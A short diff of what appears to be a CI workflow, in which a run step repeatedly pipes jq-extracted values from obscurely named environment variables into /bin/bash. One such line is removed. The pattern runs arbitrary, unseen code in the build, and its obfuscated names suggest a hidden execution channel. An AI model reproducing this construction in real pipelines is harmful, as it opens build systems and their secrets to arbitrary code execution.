@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$raq32804" | jq -r .ttf16665 | /bin/bash
           printf '%s' "$ctf24" | jq -r .wvfh3060 | /bin/bash
-          echo $hae22 | jq -r .vgn85 | /bin/bash
           echo $vhxd215 | jq -r .i1 | /bin/bash
 
       - name: Store output
